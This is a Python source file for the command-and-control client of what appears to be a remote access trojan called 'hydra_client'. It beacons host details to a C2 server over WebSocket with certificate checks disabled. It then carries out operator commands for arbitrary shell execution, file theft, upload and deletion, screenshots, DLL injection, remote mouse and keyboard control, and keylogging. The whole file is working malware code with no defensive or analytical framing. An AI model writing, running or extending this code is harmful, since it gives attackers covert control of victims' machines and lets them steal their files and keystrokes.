import os
import ssl
import json
import time
import base64
import socket
import random
import hashlib
import websockets
import asyncio
from typing import Dict, Any
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from hydra_client.remote_control import RemoteControl
from hydra_client.process_manager import ProcessManager
from hydra_client.registry_manager import RegistryManager
import uuid

class C2Communication:
    def __init__(self, server_url: str, psk: str):
        self.server_url = server_url.replace('https://', 'wss://')  # Convert to WebSocket URL
        self.psk = psk
        self.session_key = self._derive_session_key()
        self.websocket = None
        self.client_id = None
        self.remote_control = RemoteControl()
        self.process_manager = ProcessManager()
        self.registry_manager = RegistryManager()
        self.running = True
        
    def _derive_session_key(self) -> bytes:
        """Derive session key from PSK"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'hydra_c2',
            iterations=100000
        )
        return base64.urlsafe_b64encode(
            kdf.derive(self.psk.encode())
        )

    def _generate_hardware_id(self) -> str:
        """Generate unique hardware ID"""
        try:
            hostname = socket.gethostname()
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                          for elements in range(0,2*6,2)][::-1])
            id_string = f"{hostname}:{mac}"
            return hashlib.sha256(id_string.encode()).hexdigest()[:16]
        except:
            return hashlib.sha256(os.urandom(16)).hexdigest()[:16]
        
    async def _connect(self):
        """Establish WebSocket connection with retry"""
        while not self.websocket and self.running:
            try:
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                self.websocket = await websockets.connect(
                    f"{self.server_url}/c2",
                    ssl=ssl_context,
                    ping_interval=20,
                    ping_timeout=60,
                    close_timeout=10
                )
                print("[+] Connected to C2 server")
                return True
            except Exception as e:
                print(f"[-] Connection error: {str(e)}")
                await asyncio.sleep(10)  # Wait before retry
        return False

    async def _send_beacon(self):
        """Send beacon to C2 server"""
        try:
            # Get system information
            hostname = socket.gethostname()
            username = os.getenv('USERNAME')
            os_info = f"{os.name} {os.getenv('OS')}"
            
            # Generate client ID if not exists
            if not self.client_id:
                self.client_id = self._generate_hardware_id()
            
            # Prepare beacon data
            data = {
                'type': 'register',
                'client_id': self.client_id,
                'hostname': hostname,
                'ip': socket.gethostbyname(hostname),
                'os': os_info,
                'timestamp': datetime.now().isoformat()
            }
            
            await self.websocket.send(json.dumps(data))
            return True
        except Exception as e:
            print(f"[-] Beacon error: {str(e)}")
            return False

    async def run(self):
        """Main communication loop"""
        self.running = True
        while self.running:
            try:
                if not self.websocket:
                    if not await self._connect():
                        continue

                # Send initial beacon
                if not await self._send_beacon():
                    self.websocket = None
                    continue

                # Main receive loop
                async for message in self.websocket:
                    try:
                        data = json.loads(message)
                        
                        if data.get('type') == 'register_ack':
                            print("[+] Registration acknowledged")
                            
                        elif data.get('type') == 'command':
                            # Handle command
                            cmd_response = self._handle_command(data)
                            await self.websocket.send(json.dumps({
                                'type': 'command_output',
                                'client_id': self.client_id,
                                **cmd_response
                            }))
                            
                        # Send periodic beacon
                        await self.websocket.send(json.dumps({
                            'type': 'beacon',
                            'client_id': self.client_id,
                            'timestamp': datetime.now().isoformat()
                        }))
                        
                    except json.JSONDecodeError:
                        continue
                        
            except websockets.exceptions.ConnectionClosed:
                print("[-] Connection closed")
                self.websocket = None
                await asyncio.sleep(10)
                
            except Exception as e:
                print(f"[-] Error in communication loop: {str(e)}")
                self.websocket = None
                await asyncio.sleep(10)

    async def stop(self):
        """Stop C2 communication"""
        self.running = False
        if self.websocket:
            await self.websocket.close()
            self.websocket = None
        # Cleanup
        if self.remote_control:
            self.remote_control.stop_screen_capture()
            self.remote_control.stop_input_control()

    def _handle_command(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """Handle command from C2 server"""
        try:
            cmd_type = command.get('command')
            args = command.get('args', [])
            
            if cmd_type == 'shell':
                # Execute shell command
                import subprocess
                result = subprocess.run(
                    args,
                    capture_output=True,
                    text=True
                )
                return {
                    'type': 'shell_output',
                    'data': {
                        'output': result.stdout + result.stderr,
                        'exit_code': result.returncode
                    }
                }
                
            elif cmd_type == 'download':
                # Download file from target
                file_path = args[0]
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        content = f.read()
                    return {
                        'type': 'file_data',
                        'data': {
                            'content': base64.b64encode(content).decode()
                        }
                    }
                return {'type': 'error', 'data': {'message': 'File not found'}}
                
            elif cmd_type == 'upload':
                # Upload file to target
                file_path = args[0]
                content = base64.b64decode(args[1])
                try:
                    # Create directory if it doesn't exist
                    os.makedirs(os.path.dirname(file_path), exist_ok=True)
                    with open(file_path, 'wb') as f:
                        f.write(content)
                    return {'type': 'upload_status', 'data': {'status': 'success'}}
                except Exception as e:
                    return {'type': 'error', 'data': {'message': str(e)}}
                
            elif cmd_type == 'screenshot':
                # Capture screen
                try:
                    self.remote_control.start_screen_capture()
                    time.sleep(0.1)  # Wait for capture
                    
                    # Get screenshot data from remote control module
                    img_data = self.remote_control.capture_screenshot()
                    
                    self.remote_control.stop_screen_capture()
                    
                    if img_data:
                        return {
                            'type': 'screenshot', 
                            'data': {
                                'status': 'success',
                                'image_data': img_data,
                                'format': 'jpeg'
                            }
                        }
                    return {'type': 'error', 'data': {'message': 'Failed to capture screenshot'}}
                except Exception as e:
                    return {'type': 'error', 'data': {'message': str(e)}}
                
            elif cmd_type == 'process':
                # Process management
                action = args[0]
                if action == 'list':
                    processes = self.process_manager.get_process_list()
                    return {'type': 'process_list', 'data': processes}
                elif action == 'info':
                    pid = int(args[1])
                    info = self.process_manager.get_process_info(pid)
                    return {'type': 'process_info', 'data': info}
                elif action == 'kill':
                    pid = int(args[1])
                    success = self.process_manager.kill_process(pid)
                    return {
                        'type': 'process_kill', 
                        'data': {
                            'pid': pid, 
                            'success': success
                        }
                    }
                elif action == 'suspend':
                    pid = int(args[1])
                    success = self.process_manager.suspend_process(pid)
                    return {'type': 'process_suspend', 'data': {'success': success, 'pid': pid}}
                elif action == 'resume':
                    pid = int(args[1])
                    success = self.process_manager.resume_process(pid)
                    return {'type': 'process_resume', 'data': {'success': success, 'pid': pid}}
                elif action == 'inject':
                    pid = int(args[1])
                    dll_path = args[2]
                    success = self.process_manager.inject_dll(pid, dll_path)
                    return {'type': 'process_inject', 'data': {'success': success}}
                    
            elif cmd_type == 'enable_remote_control':
                # Enable remote control
                success = self.remote_control.start_input_control()
                return {
                    'type': 'control_status',
                    'data': {
                        'status': 'enabled',
                        'success': success
                    }
                }
                
            elif cmd_type == 'disable_remote_control':
                # Disable remote control
                success = self.remote_control.stop_input_control()
                return {
                    'type': 'control_status',
                    'data': {
                        'status': 'disabled',
                        'success': success
                    }
                }
                
            elif cmd_type == 'mouse_move':
                # Handle mouse move
                x = command.get('x', 0)
                y = command.get('y', 0)
                success = self.remote_control.execute_mouse_action('move', x, y)
                return {
                    'type': 'control_status',
                    'data': {
                        'action': 'mouse_move',
                        'success': success
                    }
                }
                
            elif cmd_type == 'mouse_click':
                # Handle mouse click
                x = command.get('x', 0)
                y = command.get('y', 0)
                button = command.get('button', 'left')
                success = self.remote_control.execute_mouse_action('click', x, y, button)
                return {
                    'type': 'control_status',
                    'data': {
                        'action': 'mouse_click',
                        'success': success
                    }
                }
                
            elif cmd_type == 'mouse_down':
                # Handle mouse down
                x = command.get('x', 0)
                y = command.get('y', 0)
                button = command.get('button', 'left')
                success = self.remote_control.execute_mouse_action('down', x, y, button)
                return {
                    'type': 'control_status',
                    'data': {
                        'action': 'mouse_down',
                        'success': success
                    }
                }
                
            elif cmd_type == 'mouse_up':
                # Handle mouse up
                x = command.get('x', 0)
                y = command.get('y', 0)
                button = command.get('button', 'left')
                success = self.remote_control.execute_mouse_action('up', x, y, button)
                return {
                    'type': 'control_status',
                    'data': {
                        'action': 'mouse_up',
                        'success': success
                    }
                }
                
            elif cmd_type == 'key_down':
                # Handle key down
                key = command.get('key', '')
                success = self.remote_control.execute_keyboard_action('down', key)
                return {
                    'type': 'control_status',
                    'data': {
                        'action': 'key_down',
                        'success': success
                    }
                }
                
            elif cmd_type == 'key_up':
                # Handle key up
                key = command.get('key', '')
                success = self.remote_control.execute_keyboard_action('up', key)
                return {
                    'type': 'control_status',
                    'data': {
                        'action': 'key_up',
                        'success': success
                    }
                }
                
            elif cmd_type == 'key_press':
                # Handle key press
                key = command.get('key', '')
                success = self.remote_control.execute_keyboard_action('press', key)
                return {
                    'type': 'control_status',
                    'data': {
                        'action': 'key_press',
                        'success': success
                    }
                }
                
            elif cmd_type == 'start_keylogger':
                # Start keylogger
                print(f"[C2Communication] Received start_keylogger command")
                try:
                    success = self.remote_control.start_keylogger()
                    print(f"[C2Communication] Keylogger started: {success}")
                    return {
                        'type': 'keylogger_status',
                        'data': {
                            'status': 'started',
                            'success': success
                        }
                    }
                except Exception as e:
                    import traceback
                    print(f"[C2Communication] Error starting keylogger: {str(e)}")
                    traceback.print_exc()
                    return {
                        'type': 'keylogger_status',
                        'data': {
                            'status': 'error',
                            'success': False,
                            'error': str(e)
                        }
                    }
                
            elif cmd_type == 'stop_keylogger':
                # Stop keylogger
                print(f"[C2Communication] Received stop_keylogger command")
                try:
                    success = self.remote_control.stop_keylogger()
                    print(f"[C2Communication] Keylogger stopped: {success}")
                    return {
                        'type': 'keylogger_status',
                        'data': {
                            'status': 'stopped',
                            'success': success
                        }
                    }
                except Exception as e:
                    import traceback
                    print(f"[C2Communication] Error stopping keylogger: {str(e)}")
                    traceback.print_exc()
                    return {
                        'type': 'keylogger_status',
                        'data': {
                            'status': 'error',
                            'success': False,
                            'error': str(e)
                        }
                    }
                
            elif cmd_type == 'get_keylog_data':
                # Get keylog data
                print(f"[C2Communication] Received get_keylog_data command")
                try:
                    data = self.remote_control.get_keylog_data()
                    print(f"[C2Communication] Retrieved {len(data)} keylog entries")
                    return {
                        'type': 'keylogger_data',
                        'data': {
                            'entries': data
                        }
                    }
                except Exception as e:
                    import traceback
                    print(f"[C2Communication] Error retrieving keylog data: {str(e)}")
                    traceback.print_exc()
                    return {
                        'type': 'keylogger_data',
                        'data': {
                            'entries': [],
                            'error': str(e)
                        }
                    }
                
            elif cmd_type == 'sys_info':
                # Get system information
                import platform
                import psutil
                
                cpu_usage = psutil.cpu_percent(interval=1)
                memory = psutil.virtual_memory()
                
                sysinfo = {
                    'platform': platform.platform(),
                    'processor': platform.processor(),
                    'hostname': socket.gethostname(),
                    'username': os.getenv('USERNAME'),
                    'cpu_usage': cpu_usage,
                    'memory_total': memory.total,
                    'memory_used': memory.used,
                    'memory_percent': memory.percent
                }
                
                return {
                    'type': 'system_info',
                    'data': sysinfo
                }
                
            elif cmd_type == 'list_files':
                # List files in path
                path = args[0] if args else '/'
                try:
                    file_list = []
                    for item in os.listdir(path):
                        item_path = os.path.join(path, item)
                        try:
                            stats = os.stat(item_path)
                            file_list.append({
                                'name': item,
                                'path': item_path,
                                'type': 'directory' if os.path.isdir(item_path) else 'file',
                                'size': stats.st_size,
                                'modified': stats.st_mtime
                            })
                        except:
                            continue
                    return {'type': 'file_list', 'data': {'files': file_list, 'path': path}}
                except Exception as e:
                    return {'type': 'error', 'data': {'message': str(e)}}
                    
            elif cmd_type == 'delete_file':
                # Delete file
                path = args[0]
                try:
                    if os.path.isdir(path):
                        import shutil
                        shutil.rmtree(path)
                    else:
                        os.remove(path)
                    return {'type': 'file_deleted', 'data': {'path': path, 'success': True}}
                except Exception as e:
                    return {'type': 'error', 'data': {'message': str(e)}}
                    
            # Unknown command type
            return {
                'type': 'error',
                'data': {
                    'message': f'Unknown command type: {cmd_type}'
                }
            }
                
        except Exception as e:
            return {
                'type': 'error',
                'data': {
                    'message': f'Error handling command: {str(e)}'
                }
            } 